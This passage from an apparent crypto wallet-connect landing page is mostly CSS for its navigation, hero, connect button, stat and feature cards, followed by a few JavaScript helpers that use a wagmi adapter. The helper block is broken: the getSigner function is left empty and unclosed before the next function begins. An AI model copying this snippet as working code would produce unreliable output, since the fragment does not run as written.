      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
      background: var(--bg);
      color: var(--text);
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      overflow-x: hidden;
    }

    /* Animated gradient background */
    .bg-gradient {
      position: fixed;
      inset: 0;
      background: radial-gradient(ellipse at 50% 0%, rgba(99,102,241,0.08) 0%, transparent 60%),
                  radial-gradient(ellipse at 80% 50%, rgba(168,85,247,0.05) 0%, transparent 50%),
                  radial-gradient(ellipse at 20% 80%, rgba(59,130,246,0.05) 0%, transparent 50%);
      pointer-events: none;
      z-index: 0;
    }

    .container {
      position: relative;
      z-index: 1;
      width: 100%;
      max-width: 1200px;
      padding: 0 24px;
    }

    /* Navigation */
    nav {
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 20px 0;
      border-bottom: 1px solid var(--border);
    }
    .logo {
      display: flex;
      align-items: center;
      gap: 10px;
      font-weight: 700;
      font-size: 1.1rem;
    }
    .logo-icon {
      width: 32px;
      height: 32px;
      background: var(--accent);
      border-radius: 8px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 16px;
    }
    .nav-links {
      display: flex;
      gap: 28px;
      list-style: none;
    }
    .nav-links a {
      color: var(--muted);
      text-decoration: none;
      font-size: 0.88rem;
      font-weight: 500;
      transition: color 0.2s;
    }
    .nav-links a:hover { color: var(--text); }

    /* Hero */
    .hero {
      text-align: center;
      padding: 80px 0 40px;
    }
    .badge {
      display: inline-flex;
      align-items: center;
      gap: 6px;
      background: var(--accent-glow);
      border: 1px solid rgba(99,102,241,0.3);
      border-radius: 999px;
      padding: 6px 14px;
      font-size: 0.75rem;
      font-weight: 600;
      color: var(--accent);
      margin-bottom: 24px;
      letter-spacing: 0.02em;
    }
    .badge::before { content: "✦"; }
    h1 {
      font-size: clamp(2.2rem, 5vw, 3.8rem);
      font-weight: 800;
      line-height: 1.1;
      margin-bottom: 18px;
      background: linear-gradient(135deg, #fff 0%, #a5b4fc 50%, #818cf8 100%);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
    }
    .hero p {
      color: var(--muted);
      font-size: 1.1rem;
      max-width: 540px;
      margin: 0 auto 36px;
      line-height: 1.6;
    }

    /* Connect section */
    .connect-section {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 14px;
    }
    .connect-btn {
      background: linear-gradient(135deg, var(--accent), #8b5cf6);
      color: #fff;
      border: none;
      padding: 16px 40px;
      border-radius: 14px;
      font-size: 1rem;
      font-weight: 700;
      cursor: pointer;
      transition: transform 0.15s, box-shadow 0.15s;
      box-shadow: 0 4px 24px rgba(99,102,241,0.3);
    }
    .connect-btn:hover {
      transform: translateY(-2px);
      box-shadow: 0 8px 32px rgba(99,102,241,0.4);
    }
    .connect-btn:active { transform: translateY(0); }
    .connect-hint {
      color: var(--muted);
      font-size: 0.78rem;
    }

    /* Stats */
    .stats {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
      gap: 16px;
      padding: 60px 0;
      max-width: 800px;
      margin: 0 auto;
    }
    .stat-card {
      background: var(--card);
      border: 1px solid var(--border);
      border-radius: 14px;
      padding: 24px;
      text-align: center;
    }
    .stat-value {
      font-size: 1.8rem;
      font-weight: 800;
      color: var(--text);
      margin-bottom: 4px;
    }
    .stat-label {
      color: var(--muted);
      font-size: 0.82rem;
      font-weight: 500;
    }

    /* Features */
    .features {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
      gap: 20px;
      padding: 20px 0 80px;
    }
    .feature-card {
      background: var(--card);
      border: 1px solid var(--border);
      border-radius: 16px;
      padding: 28px;
    }
    .feature-icon {
      width: 44px;
      height: 44px;
      background: var(--accent-glow);
      border-radius: 12px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 20px;
      margin-bottom: 16px;
    }
    .feature-card h3 {
      font-size: 1rem;
      font-weight: 700;
      margin-bottom: 8px;
    }
    .feature-card p {
      color: var(--muted);
      font-size: 0.85rem;
      line-height: 1.5;
    }

    /* Footer */
    footer {
      border-top: 1px solid var(--border);
      padding: 24px 0;
      text-align: center;
      color: var(--muted);
      font-size: 0.78rem;
      width: 100%;
    }

    /* Responsive */
    @media (max-width: 640px) {
      .nav-links { display: none; }
      .stats { grid-template-columns: 1fr; }
      .hero { padding: 48px 0 24px; }
    }
  </style>
</head>
```

```javascript
// ─── HELPERS ─────────────────────────────────────────────────
function getWagmiConfig() { return wagmiAdapter.wagmiConfig; }

async function getSigner() {

function shortAddr(a) { return a ? a.slice(0, 6) + "..." + a.slice(-4) : "?"; }
```
